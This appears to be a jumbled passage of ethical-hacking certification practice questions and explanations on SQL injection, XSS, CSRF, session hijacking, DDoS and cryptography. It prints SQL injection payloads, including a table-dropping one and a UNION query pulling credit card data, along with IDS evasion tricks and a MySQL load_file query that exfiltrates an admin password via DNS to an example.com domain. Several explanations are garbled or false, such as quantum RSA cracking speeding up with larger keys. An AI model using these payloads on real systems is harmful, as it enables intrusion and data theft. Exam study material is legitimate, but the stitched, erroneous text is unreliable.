For example, the hacker could replace the space character with a tab character, a newline character, a comment symbol, or a URL-encoded value, such as %2012. The other options are not correct for the following reasons: A. Utilizing the char encoding function to convert hexadecimal and decimal values into characters that pass-through SQL engine parsing: This option is not feasible because the char encoding function is not supported by all SQL engines, and it may not be able to convert all hexadecimal and decimal values into valid characters. Moreover, the char encoding function may not be able to bypass the signature detection of the IDS, as it may still match the keywords or syntax of the SQL query3. B.

The URL encoding method may not be able to replace all characters with their ASCII codes, and it may not be able to preserve the functionality and logic of the SQL query. Furthermore, the URL encoding method may not be able to evade the signature detection of the IDS, as it may still match the keywords or syntax of the SQL query4. C. Implementing sophisticated matches such as “OR ‘john’ = john\" in place of classical matches like “OR 1-1”: This option is not advanced because it is a common and basic SQL injection technique that does not involve any evasion or obfuscation. This technique involves injecting a logical expression that is always true, such as “OR ‘john’ = john” or “OR 1-1”, to bypass the authentication or authorization checks of the SQL query. However, this technique may not be able to bypass the signature detection of the IDS, as it may easily match the keywords or syntax of the SQL query.

Assume that the client has administrator-level privileges, which the attacker needs to steal that authority so as to form a brand new account with root-level access of the server to be used afterward. A tcp Hijacking is sort of a two-phased man- in-the-middle attack. The man-in-the-middle assaulter lurks within the circuit between a shopper and a server so as to work out what port and sequence numbers are being employed for the conversation. First, the attacker knocks out the client with an attack, like Ping of Death, or ties it up with some reasonably ICMP storm. This renders the client unable to transmit any packets to the server. Then, with the client crashed, the attacker assumes the client’s identity so as to talk with the server. By this suggests, the attacker gains administrator-level access to the server. One of the most effective means of preventing a hijack attack is to want a secret, that’s a shared secret between the shopper and also the server. looking on the strength of security desired, the key may be used for random exchanges. this is often once a client and server periodically challenge each other, or it will occur with each exchange, like Kerberos."}

You have implemented countermeasures against SQL injection attacks. Recently, you noticed some suspicious activities and suspect an attacker is using SQL injection techniques. The attacker is believed to use different forms of payloads in his SQL queries. In the case of a successful SQL injection attack, which of the following payloads would have the most significant impact?", "options": {"A": "'OR 'T'='1': This payload manipulates the WHERE clause of an SQL statement, allowing the attacker to view unauthorized data", "B": "'OR username LIKE '%': This payload uses the LIKE operator to search for a specific pattern in a column", "C": "OR 'a'='a'; DROP TABLE members; --: This payload combines the manipulation of the WHERE clause with a destructive action, causing data loss", "D": "UNION SELECT NULL, NULL, NULL --: This payload manipulates the UNION SQL operator, allowing the attacker to retrieve data from other tables"}, "answer": ["C"], "explanation": "The payload that would have the most significant impact in the case of a successful SQL injection attack is OR ‘a’='a; DROP TABLE members; --. This payload combines the manipulation of the WHERE clause with a destructive action, causing data loss. This payload works as follows: The OR ‘a’='a part of the payload is a logical expression that is always true, regardless of the input or the condition of the SQL statement. This part of the payload allows the attacker to bypass any authentication or authorization checks that may be implemented in the SQL statement, such as a login form or a search query. The ; part of the payload is a statement terminator that marks the end of the current SQL statement and allows the attacker to inject another SQL statement after it. This part of the payload enables the attacker to execute multiple SQL statements in a single query, which is also known as stacked queries or batched queries. The DROP TABLE members part of the payload is a destructive SQL statement that deletes the entire table named members from the database. This part of the payload causes data loss and may compromise the functionality and integrity of the application that relies on the table. The table name may vary depending on the target database, but the attacker can use other techniques, such as error-based or union-based SQL injection, to discover the table names before executing the drop statement. The – part of the payload is a comment symbol that tells the SQL engine to ignore the rest of the query. This part of the payload helps the attacker to avoid any syntax errors or unwanted results that may arise from the original query. The other options are not as impactful as option C for the following reasons: A. ‘OR 'T=\"1: This payload manipulates the WHERE clause of an SQL statement, allowing the attacker to view unauthorized data. This payload is a common and basic SQL injection technique that injects a logical expression that is always true, such as 'OR 'T=\"1 or 'OR 1=1, to bypass the authentication or authorization checks of the SQL statement. This payload can allow the attacker to view data that they are not supposed to, such as user credentials, personal information, or financial records. However, this payload does not cause any data loss or modification, and it does not affect the functionality or integrity of the application. B. ‘OR username LIKE '%: This payload uses the LIKE operator to search for a specific pattern in a column. This payload is a variation of the previous payload that injects a logical expression that is always true, such as 'OR username LIKE '% or 'OR 1 LIKE '%, to bypass the authentication or authorization checks of the SQL statement. The LIKE operator is used to compare a value with a pattern that may contain wildcard characters, such as % or _, which match any string or character.

This is because the application’s CSP allows scripts from its own domain, but not from inline or external sources. Therefore, the hacker can try to inject a payload that references a script file on the same domain as the application, such as: <script src=\"/path/to/script.js\"></script> where script.js contains some benign code, such as alert('XSS') or print('XSS'). If the script executes in the browser, then the hacker has confirmed the XSS vulnerability. Otherwise, the CSP has blocked the script and prevented the XSS attack. The other options are not feasible or effective for the following reasons: A. Try to disable the CSP to bypass script restrictions: This option is not feasible because the hacker cannot disable the CSP on the server side, and the browser enforces the CSP on the client side. The hacker would need to modify the browser settings or use a browser extension to disable the CSP, but this would not affect the victim’s browser or the application’s security. B. Inject a benign script inline to the form to see if it executes: This option is not effective because the application’s CSP disallows inline scripts, meaning scripts that are embedded in the HTML code. Therefore, the hacker would not be able to inject a script tag or an event handler attribute that contains some code, such as: <script>alert('XSS')</script> or <input type=\"text\" onfocus=\"alert('XSS')\"> The CSP would block these scripts and prevent the XSS attack. D. Load a script from an external domain to test the vulnerability: This option is not effective because the application’s CSP disallows scripts from external domains, meaning scripts that are loaded from a different domain than the application.

You must to understand what a subnet mask is and how it works. A subnetwork or subnet is a logical subdivision of an IP network.The practice of dividing a network into two or more networks is called subnetting. Computers that belong to the same subnet are addressed with an identical most-significant bit-group in their IP addresses. This results in the logical division of an IP address into two fields: the network number or routing prefix and the rest field or host identifier. The rest field is an identifier for a specific host or network interface. The routing prefix may be expressed in Classless Inter-Domain Routing (CIDR) notation written as the first address of a network, followed by a slash character (/), and ending with the bit-length of the prefix. For example, 198.51.100.0/24 is the prefix of the Internet Protocol version 4 network starting at the given address, having 24 bits allocated for the network prefix, and the remaining 8 bits reserved for host addressing. Addresses in the range 198.51.100.0 to 198.51.100.255 belong to this network. The IPv6 address specification 2001:db8::/32 is a large address block with 296 addresses, having a 32-bit routing prefix. For IPv4, a network may also be characterized by its subnet mask or netmask, which is the bitmask that when applied by a bitwise AND operation to any IP address in the network, yields the routing prefix. Subnet masks are also expressed in dot-decimal notation like an address. For example, 255.255.255.0 is the subnet mask for the prefix 198.51.100.0/24. Table Description automatically generated"}

By sending a TCP packet with these flags enabled to an open TCP port and observing the reply, the ethical hacker can probe the nature of the response and subsequently determine the OS fingerprint. The ethical hacker adopted this specific approach because it is an advanced and stealthy technique that can evade some firewalls and intrusion detection systems (IDS) that may block or alert other types of packets, such as NULL, FIN, or Xmas packets.

{"id": 39, "topic": 3, "question": "You are the lead cybersecurity analyst at a multinational corporation that uses a hybrid encryption system to secure inter-departmental communications. The system uses RSA encryption for key exchange and AES for data encryption, taking advantage of the strengths of both asymmetric and symmetric encryption. Each RSA key pair has a size of 'n' bits, with larger keys providing more security at the cost of slower performance. The time complexity of generating an RSA key pair is O(n*2), and AES encryption has a time complexity of O(n). An attacker has developed a quantum algorithm with time complexity O((log n)*2) to crack RSA encryption. Given n=4000 and variable 'AES key size', which scenario is likely to provide the best balance of security and performance?", "options": {"A": "AES key size=128 bits: This configuration provides less security but RSA key generation and AES encryption will be faster.", "B": "AES key size=256 bits: This configuration provides a high level of security, but RSA key generation may be slow.", "C": "AES key size=192 bits: This configuration is a balance between options A and B, providing moderate security and performance.", "D": "AES key size=512 bits: This configuration provides the highest level of security but at a significant performance cost."}, "answer": ["C"], "explanation": "A hybrid encryption system is a system that combines the advantages of both asymmetric and symmetric encryption algorithms. Asymmetric encryption, such as RSA, uses a pair of keys: a public key and a private key, which are mathematically related but not identical. Asymmetric encryption can provide key exchange, authentication, and non-repudiation, but it is slower and less efficient than symmetric encryption. Symmetric encryption, such as AES, uses a single key to encrypt and decrypt data. Symmetric encryption is faster and more efficient than asymmetric encryption, but it requires a secure way to share the key. In a hybrid encryption system, RSA encryption is used for key exchange, and AES encryption is used for data encryption. This way, the system can benefit from the security of RSA and the speed of AES. However, the system also depends on the key sizes of both algorithms, which affect the security and performance of the system. The key size of RSA encryption determines the number of bits in the public and private keys. The larger the key size, the more secure the encryption, but also the slower the key generation and encryption/decryption processes. The time complexity of generating an RSA key pair is O(n*2), where n is the key size in bits. This means that the time required to generate an RSA key pair increases quadratically with the key size. For example, if it takes 1 second to generate a 1024-bit RSA key pair, it will take 4 seconds to generate a 2048-bit RSA key pair, and 16 seconds to generate a 4096-bit RSA key pair. The key size of AES encryption determines the number of bits in the symmetric key. The larger the key size, the more secure the encryption, but also the more rounds of encryption/decryption are needed. The time complexity of AES encryption is O(n), where n is the key size in bits. This means that the time required to encrypt/decrypt data increases linearly with the key size. For example, if it takes 1 second to encrypt/decrypt data with a 128-bit AES key, it will take 2 seconds to encrypt/decrypt data with a 256-bit AES key, and 4 seconds to encrypt/decrypt data with a 512-bit AES key. An attacker has developed a quantum algorithm with time complexity O((log n)*2) to crack RSA encryption. This means that the time required to break RSA encryption decreases exponentially with the key size. For example, if it takes 1 second to break a 1024-bit RSA encryption, it will take 0.25 seconds to break a 2048-bit RSA encryption, and 0.0625 seconds to break a 4096-bit RSA encryption. This makes RSA encryption vulnerable to quantum attacks, unless the key size is very large. Given n=4000 and variable AES key size, the scenario that is likely to provide the best balance of security and performance is C. AES key size=192 bits. This configuration is a compromise between options A and B, providing moderate security and performance. Option A, AES key size=128 bits, provides less security than option C, but RSA key generation and AES encrypt..."}

Firmware updates can fix security vulnerabilities, patch bugs, and improve performance of the IoT devices, making them less susceptible to malware infections and botnet recruitment12. Firmware updates can also enable new security features, such as encryption, authentication, and firewall, that can protect the IoT devices from unauthorized access and data theft3. Firmware updates should be done automatically or remotely, without requiring user intervention, to ensure timely and consistent security across the IoT network4. The other options are not as effective or feasible as firmware updates for the following reasons: B. Deploying network intrusion detection systems (IDS) across the IoT network can help detect and alert DDoS attacks, but not prevent them. IDS can monitor network traffic and identify malicious patterns, such as high volume, spoofed IP addresses, or unusual protocols, that indicate a DDoS attack5. However, IDS cannot block or mitigate the attack, and may even be overwhelmed by the flood of traffic, resulting in false positives or missed alerts. Moreover, deploying IDS across a vast network of IoT devices can be costly, complex, and resource-intensive, as it requires dedicated hardware, software, and personnel. C. Establishing strong, unique passwords for each IoT device can prevent unauthorized access and brute-force attacks, but not DDoS attacks. Passwords can protect the IoT devices from being compromised by hackers who try to guess or crack the default or weak credentials. However, passwords cannot prevent DDoS attacks that exploit known or unknown vulnerabilities in the IoT devices, such as buffer overflows, command injections, or protocol flaws. Moreover, establishing and managing strong, unique passwords for each IoT device can be challenging and impractical, as it requires user awareness, memory, and effort. D. Implementing IP address whitelisting for all IoT devices can restrict network access and communication to trusted sources, but not DDoS attacks. IP address whitelisting can filter out unwanted or malicious traffic by allowing only the predefined IP addresses to connect to the IoT devices. However, IP address whitelisting cannot prevent DDoS attacks that use spoofed or legitimate IP addresses, such as reflection or amplification attacks, that bypass the whitelisting rules. Moreover, implementing IP address whitelisting for all IoT devices can be difficult and risky, as it requires constant updating, testing, and monitoring of the whitelist, and may block legitimate or emergency traffic by mistake.

This technique can be used to bypass input validation and pattern matching measures that are based on the application’s responses. The attacker can use various SQL functions or commands that trigger DNS or HTTP requests, such as load_file, copy, dbms_ldap, etc., depending on the SQL server type123. By concatenating the data they want to extract with a domain name they own, the attacker can receive the data via DNS or HTTP logs. For example, the attacker can inject the following SQL query to exfiltrate the password of the administrator user from a MySQL database: SELECT load_file(CONCAT('\\\\\\\\',(SELECT password FROM users WHERE username='administrator'),'. example.com\\\\\\\\test.txt')) This will cause the application to send a DNS request to the domain password.example.com, where password is the actual value of the administrator’s password1.

It evaluates if the system is susceptible to any known vulnerabilities, assigns severity levels to those vulnerabilities, and recommends remediation or mitigation, if and whenever needed1. A vulnerability assessment can be performed using various tools and techniques, depending on the scope and objectives of the assessment. Considering the potential vulnerability sources, the best initial approach to vulnerability assessment is to check for hardware and software misconfigurations to identify any possible loopholes. Hardware and software misconfigurations are common sources of vulnerabilities that can expose the system to unauthorized access, data breaches, or service disruptions. Hardware and software misconfigurations can include: Insecure default settings, such as weak passwords, open ports, unnecessary services, or verbose error messages. Improper access control policies, such as granting excessive privileges, allowing anonymous access, or failing to revoke access for terminated users. Lack of encryption or authentication mechanisms, such as using plain text protocols, storing sensitive data in clear text, or transmitting data without verifying the identity of the sender or receiver. Outdated or incompatible software versions, such as using unsupported or deprecated software, failing to apply security patches, or having software conflicts or dependencies. Checking for hardware and software misconfigurations can help identify any possible loopholes that could be exploited by attackers to compromise the system or the data. Checking for hardware and software misconfigurations can be done using various tools, such as: Configuration management tools, such as Ansible, Puppet, or Chef, that can automate the deployment and maintenance of consistent and secure configurations across the system. Configuration auditing tools, such as Nipper, Lynis, or OpenSCAP, that can scan the system for deviations from the desired or expected configurations and report any issues or vulnerabilities. Configuration testing tools, such as Inspec, Serverspec, or Testinfra, that can verify the system’s compliance with the specified configuration rules and standards. Therefore, checking for hardware and software misconfigurations is the best initial approach to vulnerability assessment, as it can help identify and eliminate any possible loopholes that could pose a security risk to the system or the data.

{"id": 71, "topic": 3, "question": "A large corporate network is being subjected to repeated sniffing attacks. To increase security, the company’s IT department decides to implement a combination of several security measures. They permanently add theMAC address of the gateway to the ARP cache, switch to using IPv6 instead of IPv4, implement the use of encrypted sessions such as SSH instead of Telnet, and use Secure File Transfer Protocol instead of FTP. However, they are still faced with the threat of sniffing. Considering the countermeasures, what should be their next step to enhance network security?", "options": {"A": "Use HTTP instead of HTTPS for protecting usernames and passwords", "B": "Implement network scanning and monitoring tools", "C": "Enable network identification broadcasts", "D": "Retrieve MAC addresses from the OS"}, "answer": ["B"], "explanation": "Sniffing attacks are a type of network attack that involves intercepting and analyzing data packets as they travel over a network. Sniffing attacks can be used to steal sensitive information, such as usernames, passwords, credit card numbers, etc. Sniffing attacks can also be used to perform reconnaissance, spoofing, or man-in-the-middle attacks. The IT department of the company has implemented some security measures to prevent or mitigate sniffing attacks, such as: Adding the MAC address of the gateway to the ARP cache: This prevents ARP spoofing, which is a technique that allows an attacker to redirect network traffic to their own device by sending fake ARP messages that associate their MAC address with the IP address of the gateway. Switching to IPv6 instead of IPv4: This reduces the risk of IP spoofing, which is a technique that allows an attacker to send packets with a forged source IP address, pretending to be another device on the network. Using encrypted sessions such as SSH instead of Telnet, and Secure File Transfer Protocol instead of FTP: This protects the data from being read or modified by an attacker who can capture the packets, as the data is encrypted and authenticated using cryptographic protocols. However, these measures are not enough to completely eliminate the threat of sniffing, as an attacker can still use other techniques, such as: Passive sniffing: This involves monitoring the network traffic without injecting any packets or altering the data. Passive sniffing can be done on a shared network, such as a hub, or on a switched network, using techniques such as MAC flooding, port mirroring, or VLAN hopping. Active sniffing: This involves injecting packets or modifying the data to manipulate the network behavior or gain access to more traffic. Active sniffing can be done using techniques such as DHCP spoofing, DNS poisoning, ICMP redirection, or TCP session hijacking. Therefore, the next step to enhance network security is to implement network scanning and monitoring tools, which can help detect and prevent sniffing attacks by: Scanning the network for unauthorized devices, such as rogue access points, hubs, or sniffers, and removing them or isolating them from the network. Monitoring the network for abnormal traffic patterns, such as excessive ARP requests, DNS queries, ICMP messages, or TCP connections, and alerting the network administrators or blocking the suspicious sources. Analyzing the network traffic for malicious content, such as malware, phishing, or exfiltration, and filtering or quarantining the infected or compromised devices.

These holes show up when the data provided by a web client, most commonly in HTTP query parameters (e.g. HTML form submission), is used immediately by server-side scripts to parse and display a page of results for and to that user, without properly sanitizing the content. Because HTML documents have a flat, serial structure that mixes control statements, formatting, and the actual content, any non-validated user-supplied data included in the resulting page without proper HTML encoding, may lead to markup injection. A classic example of a potential vector is a site search engine: if one searches for a string, the search string will typically be redisplayed verbatim on the result page to indicate what was searched for.

This technique involves splitting SQL keywords or operators into smaller parts and joining them with string concatenation operators, such as ‘+’ or ‘||’. This way, the SQL query can still be executed by the database engine, but the IDS cannot recognize the keywords or operators as malicious, as they are hidden within strings. For example, the hacker could replace the keyword ‘OR’ with ‘O’||‘R’ or ‘O’+‘R’ in the SQL query, and the IDS would not be able to match the signature of a typical SQL injection pattern12. The other options are not as effective as option D for the following reasons: A. Implement case variation by altering the case of SQL statements: This option is not effective because most SQL engines and IDS systems are case-insensitive, meaning that they treat SQL keywords and operators the same regardless of their case. Therefore, altering the case of SQL statements would not help evade the IDS signature detection, as the IDS would still be able to match the signature of a typical SQL injection pattern3. B. Employ IP fragmentation to obscure the attack payload: This option is not applicable because IP fragmentation is a network-level technique that splits IP packets into smaller fragments to fit the maximum transmission unit (MTU) of the network. IP fragmentation does not affect the content or structure of the SQL query, and it does not help evade the IDS signature detection, as the IDS would still be able to reassemble the fragments and match the signature of a typical SQL injection pattern4. C. Use Hex encoding to represent the SQL query string: This option is not feasible because Hex encoding is a method of representing binary data in hexadecimal format, such as ‘0x41’ for ‘A’. Hex encoding does not work for SQL queries, as the SQL engine would not be able to interpret the hexadecimal values as valid SQL syntax.

There is a straightforward way for an active worm a simple this obstacle, that we term hit-list scanning. Before the worm is free, the worm author collects a listing of say ten,000 to 50,000 potentially vulnerable machines, ideally ones with sensible network connections. The worm, when released onto an initial machine on this hit-list, begins scanning down the list. once it infects a machine, it divides the hit-list in half, communicating half to the recipient worm, keeping the other half. This fast division ensures that even if only 10-20% of the machines on the hit-list are actually vulnerable, an active worm can quickly bear the hit-list and establish itself on all vulnerable machines in only some seconds. though the hit-list could begin at 200 kilobytes, it quickly shrinks to nothing during the partitioning. This provides a great benefit in constructing a quick worm by speeding the initial infection.

The attacker injects malicious SQL code into the user input, such as a login form, that is then executed by the database server. This can allow the attacker to access, modify, or delete data, or execute commands on the database server. The ‘UNION’ SQL keyword is often used in SQL Injection attacks to combine the results of two or more SELECT statements into a single result set. This can allow the attacker to retrieve additional data from other tables or columns that are not intended to be displayed by the application. For example, if the application uses the following query to check the user credentials: SELECT * FROM users WHERE username = '$username' AND password = '$password' The attacker can inject a ‘UNION’ statement to append another query, such as: ' OR 1 = 1 UNION SELECT * FROM credit_cards -- This will result in the following query being executed by the database server: SELECT * FROM users WHERE username = '' OR 1 = 1 UNION SELECT * FROM credit_cards --' AND password = '$password' The first part of the query will always return true, and the second part of the query will return the data from the credit_cards table. The ‘–’ symbol is a comment that will ignore the rest of the query. The attacker can then see the credit card information in the application’s response. However, some web applications implement security measures to prevent SQL Injection attacks, such as filtering special characters in user inputs. Special characters are symbols that have a special meaning in SQL, such as quotes, semicolons, dashes, etc. By filtering or escaping these characters, the application can prevent the attacker from injecting malicious SQL code. For example, if the application replaces single quotes with two single quotes, the previous injection attempt will fail, as the query will become: SELECT * FROM users WHERE username = '''' OR 1 = 1 UNION SELECT * FROM credit_cards --'' AND password = '$password' This will result in a syntax error, as the query is not valid SQL. In this challenging environment, if the hacker still intends to exploit this SQL Injection vulnerability, the strategy that he is most likely to employ is to bypass the special character filter by encoding his malicious input. Encoding is a process of transforming data into a different format, such as hexadecimal, base64, URL, etc. By encoding his input, the hacker can avoid the filter and still inject malicious SQL code. For example, if the hacker encodes his input using URL encoding, the previous injection attempt will become: %27%20OR%201%20%3D%201%20UNION%20SELECT%20*%20FROM%20credit_cards%20-- This will result in the following query being executed by the database server, after the application decodes the input: SELECT * FROM users WHERE username = '' OR 1 = 1 UNION SELECT * FROM credit_cards --' AND password = '$password' This will succeed in returning the credit card inform..."}

With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application. CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim’s behalf. For most sites, browser requests automatically include any credentials associated with the site, such as the user’s session cookie, IP address, Windows domain credentials, and so forth. Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim. CSRF attacks target functionality that causes a state change on the server, such as changing the victim’s email address or password, or purchasing something. Forcing the victim to retrieve data doesn’t benefit an attacker because the attacker doesn’t receive the response, the victim does. As such, CSRF attacks target state- changing requests. It’s sometimes possible to store the CSRF attack on the vulnerable site itself. Such vulnerabilities are called “stored CSRF flaws”. This can be accomplished by simply storing an IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting attack. If the attack can store a CSRF attack in the site, the severity of the attack is amplified. In particular, the likelihood is increased because the victim is more likely to view the page containing the attack than some random page on the Internet. The likelihood is also increased because the victim is sure to be authenticated to the site already."}

An finally, there shouldn't be unpredictable parameters on the request. Several counter-measures could be in place to avoid this vulnerability. Common defenses: - SameSite cookies: If the session cookie is using this flag, you may not be able to send the cookie from arbitrary web sites. - Cross-origin resource sharing: Depending on which kind of HTTP request you need to perform to abuse the relevant action, you may take int account the CORS policy of the victim site. Note that the CORS policy won't affect if you just want to send a GET request or a POST request from a form and you don't need to read the response. - Ask for the password user to authorise the action. - Resolve a captcha - Read the Referrer or Origin headers.

A TCP SYN flood attack is a type of DoS attack that exploits the TCP handshake process by sending a large number of SYN requests to the target server, without completing the connection. A UDP flood attack is a type of DoS attack that sends a large number of UDP packets to random ports on the target server, forcing it to check for the application listening at that port and reply with an ICMP packet. An ICMP flood attack is a type of DoS attack that sends a large number of ICMP packets, such as ping requests, to the target server, overwhelming its ICMP processing capacity. The attacker’s strategy involves a unique mixture of TCP SYN, UDP, and ICMP floods, using ‘r’ packets per second. The server can handle ‘h’ packets per second before it starts showing signs of strain. If ‘r’ surpasses ‘h’, it overwhelms the server, causing it to become unresponsive. The attacker selects ‘r’ as a composite number and ‘h’ as a prime number, making the attack detection more challenging. This is because prime numbers are less predictable and more difficult to factorize than composite numbers, which may hinder the analysis of the attack pattern. Considering ‘r=2010’ and different values for ‘h’, the scenario that would potentially cause the server to falter is the one where ‘h=1987’ (prime). This is because ‘r’ is greater than ‘h’ by 23 packets per second, which means the server cannot handle the incoming traffic and will eventually run out of resources. The other scenarios would not cause the server to falter, as ‘h’ is either greater than or very close to ‘r’, which means the server can either manage or barely cope with the incoming traffic.

TCP reset is a way of terminating an established TCP connection by sending a packet with the RST flag set, indicating that the sender does not want to continue the communication. RST hijacking involves sending a forged RST packet to one or both ends of a TCP connection, using a spoofed source IP address and a guessed acknowledgment number, to trick them into believing that the other end has closed the connection. As a result, the victim’s connection is reset and the attacker can take over the session or launch a denial-of-service attack12. The other options are not correct for the following reasons: A. TCP/IP hijacking: This option is a general term that refers to any type of network-level session hijacking technique that targets TCP/IP connections. RST hijacking is a specific type of TCP/IP hijacking, but not the only one. Other types of TCP/IP hijacking include SYN hijacking, source routing, and sequence prediction3. B. UDP hijacking: This option is not applicable because UDP is a connectionless protocol that does not use TCP reset mechanism. UDP hijacking is a type of network-level session hijacking technique that targets UDP connections, such as DNS or VoIP. UDP hijacking involves intercepting and modifying UDP packets to redirect or manipulate the communication between the sender and the receiver4. D. Blind hijacking: This option is not accurate because blind hijacking is a type of network-level session hijacking technique that does not require injecting RST packets. Blind hijacking involves guessing the sequence and acknowledgment numbers of a TCP connection without being able to see the responses from the target. Blind hijacking can be used to inject malicious data or commands into an active TCP session, but not to reset the connection5.

The attacker can adjust the frequency and duration of the pulses to maximize the impact and evade detection. A Pulse Wave attack can exhaust the network resources of the target, as well as the resources of any DDoS mitigation service that the target may use. A Pulse Wave attack can also conceal the attacker’s identity, as the traffic originates from multiple sources that are part of the botnet. A Pulse Wave attack can bypass simple defensive measures, such as IP-based blocking, as the traffic can appear legitimate and vary in source IP addresses. The other options are less effective or feasible for the attacker’s objectives. A protocol-based SYN flood attack is a type of DDoS attack that exploits the TCP handshake process by sending a large number of SYN requests to the target server, without completing the connection. This consumes the connection state tables on the server, preventing it from accepting new connections. However, a SYN flood attack can be easily detected and mitigated by using SYN cookies or firewalls. A SYN flood attack can also expose the attacker’s identity, as the source IP addresses of the SYN requests can be traced back to the attacker. An ICMP flood attack is a type of DDoS attack that sends a large number of ICMP packets, such as ping requests, to the target server, overwhelming its ICMP processing capacity. However, an ICMP flood attack from a single IP can be easily blocked by using IP-based filtering or disabling ICMP responses. An ICMP flood attack can also reveal the attacker’s identity, as the source IP address of the ICMP packets can be identified. A volumetric flood attack is a type of DDoS attack that sends a large amount of traffic to the target server, saturating its network bandwidth and preventing legitimate users from accessing it. However, a volumetric flood attack using a single compromised machine may not be sufficient to overwhelm the network bandwidth of a major online retailer, as the attacker’s machine may have limited bandwidth itself. A volumetric flood attack can also be detected and mitigated by using traffic shaping or rate limiting techniques.

It takes three 64-bit keys, for an overall key length of 192 bits. In Stealth, you merely type within the entire 192-bit (24 character) key instead of entering each of the three keys individually. The Triple DES DLL then breaks the user-provided key into three subkeys, padding the keys if necessary in order that they are each 64 bits long. The procedure for encryption is strictly an equivalent as regular DES, but it’s repeated 3 times , hence the name Triple DES. the info is encrypted with the primary key, decrypted with the second key, and eventually encrypted again with the third key.Triple DES runs 3 times slower than DES, but is far safer if used properly. The procedure for decrypting something is that the same because the procedure for encryption, except it’s executed in reverse. Like DES, data is encrypted and decrypted in 64-bit chunks. Although the input key for DES is 64 bits long, the particular key employed by DES is merely 56 bits long . the smallest amount significant (right-most) bit in each byte may be a parity , and will be set in order that there are always an odd number of 1s in every byte. These parity bits are ignored, so only the seven most vital bits of every byte are used, leading to a key length of 56 bits. this suggests that the effective key strength for Triple DES is really 168 bits because each of the three keys contains 8 parity bits that aren’t used during the encryption process.Triple DES ModesTriple ECB (Electronic Code Book)• This variant of Triple DES works precisely the same way because the ECB mode of DES.• this is often the foremost commonly used mode of operation.Triple CBC (Cipher Block Chaining)• This method is extremely almost like the quality DES CBC mode.• like Triple ECB, the effective key length is 168 bits and keys are utilized in an equivalent manner, as described above, but the chaining features of CBC mode also are employed.• the primary 64-bit key acts because the Initialization Vector to DES.• Triple ECB is then executed for one 64-bit block of plaintext.• The resulting ciphertext is then XORed with subsequent plaintext block to be encrypted, and therefore the procedure is repeated.• This method adds an additional layer of security to Triple DES and is therefore safer than Triple ECB, although it’s not used as widely as Triple ECB."}

Which of the following actions would best protect your web server from potential misconfiguration-based attacks?", "options": {"A": "Performing regular server configuration audits", "B": "Enabling multi-factor authentication for users", "C": "Implementing a firewall to filter traffic", "D": "Regularly backing up server data"}, "answer": ["A"], "explanation": "The action that would best protect your web server from potential misconfiguration-based attacks is performing regular server configuration audits. A server configuration audit is a process of reviewing and verifying the security settings and parameters of the server, such as user accounts, permissions, services, ports, protocols, files, directories, logs, and patches. A server configuration audit can help you to identify and fix any security misconfigurations that may expose your server to attacks, such as using default credentials, enabling unnecessary services, leaving open ports, or missing security updates. A server configuration audit can also help you to comply with the security standards and best practices for your server, such as the CIS Benchmarks or the OWASP Secure Configuration Guide12. The other options are not as effective as option A for the following reasons: B. Enabling multi-factor authentication for users: This option is not relevant because it does not address the server misconfiguration issue, but the user authentication issue. Multi-factor authentication is a method of verifying the identity of the users by requiring them to provide two or more pieces of evidence, such as a password, a code, or a biometric factor. Multi-factor authentication can enhance the security of the user accounts and prevent unauthorized access, but it does not prevent the server from being attacked due to misconfigured settings or parameters3. C. Implementing a firewall to filter traffic: This option is not sufficient because it does not prevent the server from being misconfigured, but only limits the exposure of the server to the network. A firewall is a device or software that monitors and controls the incoming and outgoing network traffic based on predefined rules. A firewall can protect the server from external attacks by blocking or allowing certain ports, protocols, or IP addresses. However, a firewall cannot protect the server from internal attacks or from attacks that exploit the allowed traffic. Moreover, a firewall itself can be misconfigured and cause security issues4. D. Regularly backing up server data: This option is not preventive but reactive, as it does not protect the server from being attacked, but only helps to recover the data in case of an attack. Backing up server data is a process of creating and storing copies of the data on the server, such as files, databases, or configurations. Backing up server data can help you to restore the data in case of data loss, corruption, or deletion due to an attack. However, backing up server data does not prevent the server from being attacked in the first place, and it does not fix the security misconfigurations that may have caused the attack5.

They can provide improved patient care and comfort, but they also pose security challenges and risks, as they can be targeted by cyberattacks, such as ransomware, that can compromise their functionality, integrity, or confidentiality. Ransomware is a type of malware that encrypts the victim’s data or system and demands a ransom for its decryption or restoration. Ransomware attacks can cause serious harm to healthcare organizations, as they can disrupt their operations, endanger their patients, and damage their reputation. To protect IoMT devices from ransomware attacks, the main recommendation is to use network segmentation to isolate IoMT devices from the main network. Network segmentation is a technique that divides a network into smaller subnetworks, each with its own security policies and controls. Network segmentation can prevent or limit the spread of ransomware from one subnetwork to another, as it restricts the communication and access between them. Network segmentation can also improve the performance, visibility, and manageability of the network, as it reduces the network congestion, complexity, and noise. The other options are not as effective or feasible as network segmentation. Implementing multi-factor authentication for all IoMT devices may not be possible or practical, as some IoMT devices may not support or require user authentication, such as sensors or monitors. Disabling all wireless connectivity on IoMT devices may not be desirable or realistic, as some IoMT devices rely on wireless communication protocols, such as Wi-Fi, Bluetooth, or Zigbee, to function or transmit data. Regularly changing the IP addresses of all IoMT devices may not prevent or deter ransomware attacks, as ransomware can target devices based on other factors, such as their domain names, MAC addresses, or vulnerabilities.

Symmetric encryption is a method of encrypting and decrypting data using the same secret key, which is faster and more efficient than asymmetric encryption. Asymmetric encryption is a method of encrypting and decrypting data using a pair of keys: a public key and a private key, which are mathematically related but not identical. Asymmetric encryption can provide authentication, integrity, and non-repudiation, as well as key distribution. The cryptographic technique that would best serve the purpose is to apply asymmetric encryption with RSA and use the private key for signing. RSA is a widely used algorithm for asymmetric encryption, which is based on the difficulty of factoring large numbers. RSA can be used to encrypt data, as well as to generate digital signatures, which are a way of proving the identity and authenticity of the sender and the integrity of the message. The steps to implement this technique are as follows1: Generate a pair of keys for each user: a public key and a private key. The public key can be shared with anyone, while the private key must be kept secret and protected by the user. When a user wants to send an email to another user, they first encrypt the email content with a symmetric key, such as AES, which is a strong and efficient algorithm for symmetric encryption. The symmetric key is then encrypted with the recipient’s public key, using RSA. The encrypted email and the encrypted symmetric key are then sent to the recipient. The sender also generates a digital signature for the email, using their private key and a hash function, such as SHA-256, which is a secure and widely used algorithm for generating hashes. A hash function is a mathematical function that takes any input and 